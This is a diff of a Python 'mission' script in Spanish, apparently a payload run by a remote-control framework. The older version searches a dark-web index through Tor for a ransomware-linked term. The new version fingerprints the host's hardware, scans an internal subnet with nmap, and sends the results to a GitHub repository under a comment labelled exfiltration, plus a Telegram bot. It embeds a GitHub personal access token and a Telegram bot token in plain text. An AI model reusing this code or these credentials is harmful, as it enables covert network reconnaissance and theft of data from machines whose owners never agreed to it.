@@ -1,48 +1,53 @@
-# MISSION BRAIN V26.0 - DARK SONDA Φ
-import os, subprocess, time, requests, socket, threading, base64
+# MISSION BRAIN V27.0 - INDUCTION Φ
+import os, subprocess, time, requests, base64, socket
 
 def execute_mission(ui, ID):
-    ui.log("Iniciando Mision V26.0: Dark Sonda (RansomHub Search)...")
     try:
-        # 1. Armamento OSINT (proxychains4, nmap, tor)
-        ui.log("Instalando armamento OSINT...")
-        os.system("apt-get update -qq && apt-get install -y tor proxychains4 nmap curl -qq > /dev/null 2>&1")
+        ui.log('Iniciando Mision V27.0 (Validada por Induccion)...')
         
-        # 2. Configurar Proxychains
-        with open("/etc/proxychains4.conf", "w") as f:
-            f.write("strict_chain\nproxy_dns\nremote_dns_subnet 224.0.0.0\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nsocks5 127.0.0.1 9050\n")
+        # 1. Caracterizacion de Hardware
+        gpu = subprocess.getoutput("nvidia-smi -L || echo NoGPU")
+        cpu = subprocess.getoutput("lscpu | grep 'Model name' | head -n 1")
         
-        # 3. Asegurar Tor Local
-        os.system("pkill -9 tor; sleep 2; nohup tor > /dev/null 2>&1 &")
-        time.sleep(30)
+        # 2. Reconocimiento de Red
+        ui.log('Escaneando malla interna...')
+        net = subprocess.getoutput("nmap -F 172.28.0.0/24 | grep 'report for' -A 1")
         
-        # 4. Busqueda en Ahmia (Dark Web Search)
-        ui.log("Buscando rastros de 1Feex en Ahmia...")
-        search_url = "http://juhanur2ik43jecy.onion/search/?q=1Feex"
-        # Intentar peticion via proxychains
-        res = subprocess.getoutput("proxychains4 curl -s -L " + search_url + " | grep -o '[a-z2-7]\{56\}.onion' | sort -u | head -n 5")
+        # 3. Ensamblaje de Reporte (Pureza ASCII)
+        NL = chr(10)
+        report = "--- REPORT " + str(ID) + " ---" + NL
+        report += "CPU: " + str(cpu).strip() + NL
+        report += "GPU: " + str(gpu).strip() + NL
+        report += "NET:" + NL + str(net) + NL
         
-        ui.log("Servicios relacionados detectados:")
-        for onion in res.splitlines(): ui.log("-> " + onion)
+        # 4. Alerta Telegram
+        tg_token = "8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8"
+        tg_chat = "7713278946"
+        tg_url = "https://api.telegram.org/bot" + tg_token + "/sendMessage"
+        requests.post(tg_url, data={"chat_id": tg_chat, "text": "✅ [SPECTER] Mision V27.0 completada para " + str(ID)})
         
-        # 5. Reporte a Telegram
-        tg_msg = "🕵️ [DARK SONDA] Busqueda finalizada para 1Feex.\nOnions detectadas:\n" + res
-        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", 
-                      data={"chat_id": "7713278946", "text": tg_msg})
-        
-        # 6. Anclaje en Repositorio
+        # 5. Exfiltracion a GitHub
         T1 = "github_pat_11B43LNKI"
         T2 = "0LNcIXtVPYanP_CyPZqVH8sNnWlDMzN4W9se0nhC3Fy0ad2g69a8aa9APRMTWMUAFMELmuIcS"
         headers = {"Authorization": "token " + T1 + T2}
-        url = "https://api.github.com/repos/AGINFT/gamma-actions-test/contents/intel/" + str(ID) + "_dark.txt"
+        url = "https://api.github.com/repos/AGINFT/gamma-actions-test/contents/reports/" + str(ID) + ".txt"
+        
         r_get = requests.get(url, headers=headers)
         sha = r_get.json().get("sha") if r_get.status_code == 200 else None
-        encoded = base64.b64encode(res.encode()).decode()
-        data = {"message": "Dark Recon " + str(ID), "content": encoded, "branch": "main"}
-        if sha: data["sha"] = sha
-        requests.put(url, headers=headers, json=data)
         
-        ui.update("DARK RECON COMPLETO", 100, 10)
+        encoded = base64.b64encode(report.encode()).decode()
+        data = {"message": "Induction " + str(ID), "content": encoded, "branch": "main"}
+        if sha: data["sha"] = sha
+        
+        r_put = requests.put(url, headers=headers, json=data)
+        if r_put.status_code in [200, 201]:
+            ui.log("Datos anclados en la nube exitosamente.")
+            try: ui.update("VIGILIA V27.0 OK", 100, 95)
+            except: pass
+        else:
+            ui.log("Error en anclaje: " + str(r_put.status_code))
+            
     except Exception as e:
-        ui.log("Error en V26.0: " + str(e))
+        ui.log("Error critico V27.0: " + str(e))
+    
     return True
